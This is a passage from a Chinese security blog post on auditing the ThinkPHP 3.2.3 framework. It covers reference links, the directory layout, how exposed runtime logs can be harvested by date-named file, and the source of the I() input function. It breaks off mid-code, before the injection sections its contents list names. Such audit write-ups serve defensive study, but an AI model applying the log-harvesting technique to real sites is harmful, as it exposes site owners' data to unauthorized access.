<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"mi3aka.eu.org","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="https://mi3aka.eu.org/2022/03/21/ThinkPHP_V3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mi3aka.eu.org/2022/03/21/ThinkPHP_V3/","path":"2022/03/21/ThinkPHP_V3/","title":"ThinkPHP_V3"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ThinkPHP_V3 | Misaka's Blog</title>
  





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Misaka's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-首页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-关于"><a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-安全"><a href="https://github.com/mi3aka/huaQ" rel="noopener" target="_blank"><i class="fas fa-shield-alt fa-fw fa-fw"></i>安全</a></li><li class="menu-item menu-item-工具"><a href="https://tools.mi3aka.eu.org/" rel="noopener" target="_blank"><i class="fas fa-tools fa-fw"></i>工具</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cms%E7%BB%84%E6%88%90"><span class="nav-number">2.</span> <span class="nav-text">cms组成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="nav-number">3.</span> <span class="nav-text">参数传递</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E5%BF%AB%E6%8D%B7%E6%96%B9%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">其他快捷方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8C%85%E8%A3%B9%E5%AF%BC%E8%87%B4%E5%8F%98%E9%87%8F%E8%A2%AB%E7%9B%B4%E6%8E%A5%E8%A7%A3%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">双引号包裹导致变量被直接解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bind%E6%B3%A8%E5%85%A5"><span class="nav-number">5.2.</span> <span class="nav-text">bind注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#find-select-delete-%E6%B3%A8%E5%85%A5"><span class="nav-number">5.3.</span> <span class="nav-text">find() select() delete()注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">5.4.</span> <span class="nav-text">order by注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group%E6%B3%A8%E5%85%A5"><span class="nav-number">5.5.</span> <span class="nav-text">group注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#having%E6%B3%A8%E5%85%A5"><span class="nav-number">5.6.</span> <span class="nav-text">having注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#count-sum-min-max-avg%E6%B3%A8%E5%85%A5"><span class="nav-number">5.7.</span> <span class="nav-text">count sum min max avg注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%AD%98getshell"><span class="nav-number">6.</span> <span class="nav-text">缓存getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%E4%B8%8B%E9%80%A0%E6%88%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">7.</span> <span class="nav-text">特殊情况下造成命令执行</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Misaka</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">38</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://akarin.dev/" title="https:&#x2F;&#x2F;akarin.dev" rel="noopener" target="_blank">存在感消失的地方|ω•`)</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://passbya.xyz/" title="https:&#x2F;&#x2F;passbya.xyz&#x2F;" rel="noopener" target="_blank">PassbyAの阿瓦隆</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://tearsjin.github.io/" title="https:&#x2F;&#x2F;tearsjin.github.io&#x2F;" rel="noopener" target="_blank">K1rit0</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://hengy1.top/" title="https:&#x2F;&#x2F;hengy1.top&#x2F;" rel="noopener" target="_blank">恒HengY1毅</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/mi3aka" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://mi3aka.eu.org/2022/03/21/ThinkPHP_V3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Misaka">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Misaka's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ThinkPHP_V3 | Misaka's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ThinkPHP_V3
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-03-21 14:08:34" itemprop="dateCreated datePublished" datetime="2022-03-21T14:08:34+08:00">2022-03-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-07-01 16:34:58" itemprop="dateModified" datetime="2022-07-01T16:34:58+08:00">2022-07-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.thinkphp.cn/download/610.html">ThinkPHP3.2.3完整版</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/282906.html">总结ThinkPHP v3的代码审计方法</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4xXS7usHMFNgDTEHcHBcBA">敏信审计系列之THINKPHP3.2开发框架 </a></p>
<p><a target="_blank" rel="noopener" href="https://hu3sky.github.io/2019/09/24/Thinkphp%E5%A4%9A%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">Thinkphp多个版本注入分析</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2630">水文-Thinkphp3.2.3安全开发须知</a></p>
<span id="more"></span>

<h2 id="cms组成"><a href="#cms组成" class="headerlink" title="cms组成"></a>cms组成</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">├─Application   项目目录</span><br><span class="line">│  ├─Common   公共模块</span><br><span class="line">│  │  ├─Common</span><br><span class="line">│  │  └─Conf</span><br><span class="line">│  ├─Home   前台模块</span><br><span class="line">│  │  ├─Common   公共函数</span><br><span class="line">│  │  ├─Conf   配置文件</span><br><span class="line">│  │  ├─Controller   控制器</span><br><span class="line">│  │  ├─Model   模型</span><br><span class="line">│  │  └─View   视图</span><br><span class="line">│  └─Runtime</span><br><span class="line">│      ├─Cache</span><br><span class="line">│      │  └─Home</span><br><span class="line">│      ├─Data</span><br><span class="line">│      ├─Logs</span><br><span class="line">│      │  └─Home</span><br><span class="line">│      └─Temp</span><br><span class="line">├─Public   资源文件目录</span><br><span class="line">└─ThinkPHP   框架目录</span><br><span class="line">    ├─Common</span><br><span class="line">    ├─Conf</span><br><span class="line">    ├─Lang</span><br><span class="line">    ├─Library</span><br><span class="line">    │  ├─Behavior</span><br><span class="line">    │  ├─Org</span><br><span class="line">    │  │  ├─Net</span><br><span class="line">    │  │  └─Util</span><br><span class="line">    │  ├─Think</span><br><span class="line">    │  │  ├─Cache</span><br><span class="line">    │  │  │  └─Driver</span><br><span class="line">    │  │  ├─Controller</span><br><span class="line">    │  │  ├─Crypt</span><br><span class="line">    │  │  │  └─Driver</span><br><span class="line">    │  │  ├─Db</span><br><span class="line">    │  │  │  └─Driver</span><br><span class="line">    │  │  ├─Image</span><br><span class="line">    │  │  │  └─Driver</span><br><span class="line">    │  │  ├─Log</span><br><span class="line">    │  │  │  └─Driver</span><br><span class="line">    │  │  ├─Model</span><br><span class="line">    │  │  ├─Session</span><br><span class="line">    │  │  │  └─Driver</span><br><span class="line">    │  │  ├─Storage</span><br><span class="line">    │  │  │  └─Driver</span><br><span class="line">    │  │  ├─Template</span><br><span class="line">    │  │  │  ├─Driver</span><br><span class="line">    │  │  │  └─TagLib</span><br><span class="line">    │  │  ├─Upload</span><br><span class="line">    │  │  │  └─Driver</span><br><span class="line">    │  │  │      ├─Bcs</span><br><span class="line">    │  │  │      └─Qiniu</span><br><span class="line">    │  │  └─Verify</span><br><span class="line">    │  │      ├─bgs</span><br><span class="line">    │  │      ├─ttfs</span><br><span class="line">    │  │      └─zhttfs</span><br><span class="line">    │  └─Vendor</span><br><span class="line">    │      ├─Boris</span><br><span class="line">    │      ├─EaseTemplate</span><br><span class="line">    │      ├─Hprose</span><br><span class="line">    │      ├─jsonRPC</span><br><span class="line">    │      ├─phpRPC</span><br><span class="line">    │      │  ├─dhparams</span><br><span class="line">    │      │  └─pecl</span><br><span class="line">    │      │      └─xxtea</span><br><span class="line">    │      │          └─test</span><br><span class="line">    │      ├─SmartTemplate</span><br><span class="line">    │      ├─Smarty</span><br><span class="line">    │      │  ├─plugins</span><br><span class="line">    │      │  └─sysplugins</span><br><span class="line">    │      ├─spyc</span><br><span class="line">    │      │  ├─examples</span><br><span class="line">    │      │  ├─php4</span><br><span class="line">    │      │  └─tests</span><br><span class="line">    │      └─TemplateLite</span><br><span class="line">    │          └─internal</span><br><span class="line">    ├─Mode</span><br><span class="line">    │  ├─Api</span><br><span class="line">    │  ├─Lite</span><br><span class="line">    │  └─Sae</span><br><span class="line">    └─Tpl</span><br></pre></td></tr></table></figure>

<p>在<code>Application\Runtime\Logs\Home</code>中含有thinkphp的运行日志,运行日志放置在网站部署目录下,直接暴露于外部,可以让攻击者获取运行日志并进行分析</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203151656805.png"></p>
<p>日志命名格式为<code>年_月_日.log</code>,因此可以编写脚本进行批量获取</p>
<p>作为一个mvc框架的cms,重点应该关注项目目录即<code>Application</code>(但是可以被设置成其他目录)   </p>
<p>模型:封装与应用程序的业务逻辑相关的数据以及对数据的处理方法</p>
<p>视图:数据显示</p>
<p>控制器:处理用户交互,从视图读取数据,向模型发送数据,也是主要审计的点</p>
<h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><p>除了使用传统的<code>$_GET</code>和<code>$_POST</code>外,thinkphp新增了一个<code>I</code>方法(<code>function I</code>),用于安全地获取用户输入</p>
<p>使用方法如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="title function_ invoke__">I</span>(<span class="string">&#x27;id&#x27;</span>,<span class="number">0</span>); 获取id参数 自动判断get或者post</span><br><span class="line"><span class="number">2</span>. <span class="title function_ invoke__">I</span>(<span class="string">&#x27;post.name&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;htmlspecialchars&#x27;</span>); 获取<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]并使用htmlspecialchars进行过滤</span><br><span class="line"><span class="number">3</span>. <span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.&#x27;</span>); 获取<span class="variable">$_GET</span></span><br></pre></td></tr></table></figure>

<p><code>ThinkPHP/Common/functions.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取输入参数 支持过滤和默认值</span></span><br><span class="line"><span class="comment"> * 使用方法:</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;</span></span><br><span class="line"><span class="comment"> * I(&#x27;id&#x27;,0); 获取id参数 自动判断get或者post</span></span><br><span class="line"><span class="comment"> * I(&#x27;post.name&#x27;,&#x27;&#x27;,&#x27;htmlspecialchars&#x27;); 获取$_POST[&#x27;name&#x27;]</span></span><br><span class="line"><span class="comment"> * I(&#x27;get.&#x27;); 获取$_GET</span></span><br><span class="line"><span class="comment"> * &lt;/code&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 变量的名称 支持指定类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $default 不存在的时候默认值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $filter 参数过滤方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed $datas 要获取的额外数据源</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">I</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$default</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$filter</span>=<span class="literal">null</span>,<span class="variable">$datas</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">static</span> <span class="variable">$_PUT</span>	=	<span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>,<span class="string">&#x27;/&#x27;</span>))&#123; <span class="comment">// 指定修饰符</span></span><br><span class="line">		<span class="keyword">list</span>(<span class="variable">$name</span>,<span class="variable">$type</span>) 	=	<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$name</span>,<span class="number">2</span>);<span class="comment">// name/s =&gt; array(&#x27;name&#x27;,&#x27;s&#x27;) =&gt; $name=&#x27;name&#x27; $type=s 字符串</span></span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">C</span>(<span class="string">&#x27;VAR_AUTO_STRING&#x27;</span>))&#123; <span class="comment">// 默认强制转换为字符串</span></span><br><span class="line">        <span class="variable">$type</span>   =   <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>,<span class="string">&#x27;.&#x27;</span>)) &#123; <span class="comment">// 指定参数来源</span></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$method</span>,<span class="variable">$name</span>) =   <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$name</span>,<span class="number">2</span>);<span class="comment">// get.a =&gt; $method=get $name=a</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 默认为自动判断</span></span><br><span class="line">        <span class="variable">$method</span> =   <span class="string">&#x27;param&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>     :   </span><br><span class="line">        	<span class="variable">$input</span> =&amp; <span class="variable">$_GET</span>;</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;post&#x27;</span>    :   </span><br><span class="line">        	<span class="variable">$input</span> =&amp; <span class="variable">$_POST</span>;</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;put&#x27;</span>     :   </span><br><span class="line">        	<span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$_PUT</span>))&#123;</span><br><span class="line">            	<span class="title function_ invoke__">parse_str</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="variable">$_PUT</span>);</span><br><span class="line">        	&#125;</span><br><span class="line">        	<span class="variable">$input</span> 	=	<span class="variable">$_PUT</span>;        </span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;param&#x27;</span>   :</span><br><span class="line">            <span class="keyword">switch</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$input</span>  =  <span class="variable">$_POST</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                	<span class="keyword">if</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$_PUT</span>))&#123;</span><br><span class="line">                    	<span class="title function_ invoke__">parse_str</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="variable">$_PUT</span>);</span><br><span class="line">                	&#125;</span><br><span class="line">                	<span class="variable">$input</span> 	=	<span class="variable">$_PUT</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$input</span>  =  <span class="variable">$_GET</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;path&#x27;</span>    :   </span><br><span class="line">            <span class="variable">$input</span>  =   <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$depr</span>   =   <span class="title function_ invoke__">C</span>(<span class="string">&#x27;URL_PATHINFO_DEPR&#x27;</span>);</span><br><span class="line">                <span class="variable">$input</span>  =   <span class="title function_ invoke__">explode</span>(<span class="variable">$depr</span>,<span class="title function_ invoke__">trim</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="variable">$depr</span>));            </span><br><span class="line">            &#125;</span><br><span class="line">            <span 